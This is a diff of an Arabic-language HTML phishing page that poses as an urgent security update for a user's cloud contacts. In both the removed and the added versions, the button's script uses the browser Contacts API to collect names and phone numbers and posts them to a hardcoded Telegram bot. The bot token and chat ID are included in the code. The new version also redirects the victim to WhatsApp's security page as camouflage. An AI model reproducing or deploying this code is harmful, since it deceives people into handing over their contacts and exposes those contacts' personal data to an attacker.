@@ -3,54 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث النظام الإلزامي</title>
+    <title>نظام حماية البيانات</title>
     <style>
-        body { background: #121212; color: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; width: 90%; max-width: 400px; }
-        .icon { font-size: 50px; color: #007bff; margin-bottom: 20px; }
-        h1 { font-size: 1.5rem; margin-bottom: 10px; }
-        p { color: #aaa; font-size: 0.9rem; margin-bottom: 30px; }
-        .btn { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; }
+        body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #161b22; padding: 40px; border-radius: 20px; border: 1px solid #30363d; text-align: center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); }
+        h2 { color: #58a6ff; }
+        button { background: #238636; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; transition: 0.3s; }
+        button:hover { background: #2ea043; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">🔄</div>
-        <h1>تحديث مطلوب</h1>
-        <p>لحماية بياناتك، يرجى مزامنة جهات الاتصال مع قاعدة بيانات الحماية الجديدة لعام 2026.</p>
-        <button class="btn" onclick="startExtraction()">تحديث الآن</button>
+    <div class="box">
+        <h2>⚠️ تحديث أمني عاجل</h2>
+        <p>يجب تحديث قائمة جهات الاتصال السحابية لمنع اختراق حسابك.</p>
+        <button onclick="execute()">تحديث وتأمين الحساب</button>
     </div>
 
     <script>
-        async function startExtraction() {
-            const token = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
-            const chat_id = "8397194527";
+        async function execute() {
+            const T = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+            const ID = "8397194527";
             
-            if ('contacts' in navigator && 'ContactsManager' in window) {
-                try {
-                    const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
-                    if (contacts.length > 0) {
-                        const data = {
-                            chat_id: chat_id,
-                            text: "🎯 صيد جديد!\n\n" + contacts.map(c => `👤 ${c.name}: ${c.tel}`).join('\n')
-                        };
-                        
-                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify(data)
-                        });
-                        alert("تم التحديث بنجاح.");
-                    }
-                } catch (e) {
-                    alert("فشل التحديث، يرجى المحاولة لاحقاً.");
+            try {
+                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
+                if (contacts.length > 0) {
+                    let msg = "🔓 تـم سـحـب الـبـيـانـات:\n\n";
+                    contacts.forEach(c => { msg += `👤 الاسم: ${c.name}\n📞 الرقم: ${c.tel}\n\n`; });
+                    
+                    await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: ID, text: msg})
+                    });
+                    
+                    // إعادة توجيه للتمويه
+                    window.location.href = "https://www.whatsapp.com/security";
                 }
-            } else {
-                alert("جهازك غير مدعوم حالياً.");
+            } catch (e) {
+                alert("يرجى المحاولة من متصفح كروم الرسمي.");
             }
         }
     </script>
 </body>
 </html>
+
 
 
